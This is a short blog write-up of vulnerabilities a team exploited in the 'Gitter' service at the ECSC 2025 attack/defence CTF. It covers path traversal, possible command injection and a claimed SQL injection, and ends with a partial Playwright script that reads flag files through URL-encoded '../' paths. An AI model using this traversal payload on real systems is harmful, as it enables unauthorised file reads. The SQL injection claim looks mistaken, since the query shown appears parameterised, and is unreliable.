+++
date = '2025-11-10T12:11:27+03:00'
draft = false
title = 'ECSC 2025 A/D - Gitter'
+++


## intro
the European Cybersecurity Challenge of 2025 has just concluded, since writeups will probably take a while to be released, I've decided to include a simple summary of the bugs we exploited on the Gitter A/D service.

## frontend module
In the `repos.ts` module, the `getFileContent` handler is vulnerable to path traversal due to the way paths are constructed.

```js
export async function getFileContent(username: string, repository_name: string, filepath: string): Promise<string> {
    const repoPath = path.join(GIT_REPOSITORIES_DIRECTORY, username, repository_name, filepath);

    return fs.promises.readFile(repoPath, 'utf8');
}
```
Since `username`, `repository_name` and `filepath` are attacker-controlled values, resulting in local file inclusion (LFI).

Additionally, the `getLastModified` function and `getFolders` by extension are opening a surface for arbitrary command injection:

```js
// page.tsx
const full_filepath = filepath.join("/");

await prepareWorkingTree(organization, repository);
const file_exists = await exists(organization, repository, full_filepath);
const is_folder = await isFolder(organization, repository, full_filepath);

const folder_path = is_folder
? full_filepath
: filepath.slice(0, -1).join("/");


const folder_contents = await getFolders(organization, repository, folder_path);
```

```js
// repos.ts
return {
    name,
    path: name,
    size: parseInt(size) || 0,
    type: type === 'tree' ? 'folder' : 'file',
    modified: await getLastModified(repoPath, name)
};
```

## internal module
Looking at the `/identity/:pubkey` route, the way the SQL query is constructed is vulnerable to injections.

```js
const user = await sql`SELECT * FROM users WHERE public_key = ${pubkey}`;
```

Additionally, at the top of the file three RegEx patterns are defined:
```js
const SSH_KEY_REGEX = /^ssh-[-a-z0-9]+ [-A-Za-z0-9+/]+={0,3}( .+)?$/;
const USER_REGEX = /^[-._a-zA-Z0-9]+$/;
const REPOSITORY_REGEX = /^[-._a-zA-Z0-9]+$/;
```
...but are never used in the module.



## Proof-of-Concept for LFI
```py
        #...
        browser = p.chromium.launch(headless=headless)
        context = browser.new_context()
        page = context.new_page()

        username = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        password = username
        randsshstuff = ''.join(random.choice(string.ascii_uppercase) for _ in range(8))
        randsshstuff2 = ''.join(random.choice(string.ascii_uppercase) for _ in range(8))
        ssh_key = f"ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAI{randsshstuff2}NTYAAABBBH1UDwvjEHIIVofBBHlJO{randsshstuff}QHr+VBdKuraxzZ9EJhXl5z47GAA6HQoBU383B9sI+tsCTD9zgf3RYLXG2A= checker@5a7f66b3f782" 
        base_url = f"http://{TARGET_IP}:{PORT}"
        timeout = 30

        # 1) Register
        status, ctype, body = submit_register(context, page, base_url, username, password, ssh_key, timeout_ms=timeout*500)
        if body: print(body)
        if not (200 <= status < 300):
            browser.close()
            sys.exit(1)

        statusL, ctypeL, bodyL = submit_login(context, page, base_url, username, password, timeout_ms=timeout*500)
        if bodyL: print(bodyL)
        if statusL >= 400:
            browser.close()
            sys.exit(2)

        status2, ctype2, body2 = submit_new_repo(context, page, base_url, username, timeout_ms=timeout*500)
        if body2: print(body2)

        ok = 200 <= status2 < 300

        for f in TARGETS:
            lfi_page = base_url + f"/{username}/{username}/tree/" f"%2E%2E%2F%2E%2E%2F{f}%2Fflag%2Fflag.txt"
            visit_and_print_flags(page, lfi_page, timeout_ms=timeout*700)
            
        browser.close()
        sys.exit(0 if ok else 3)
        # ...
```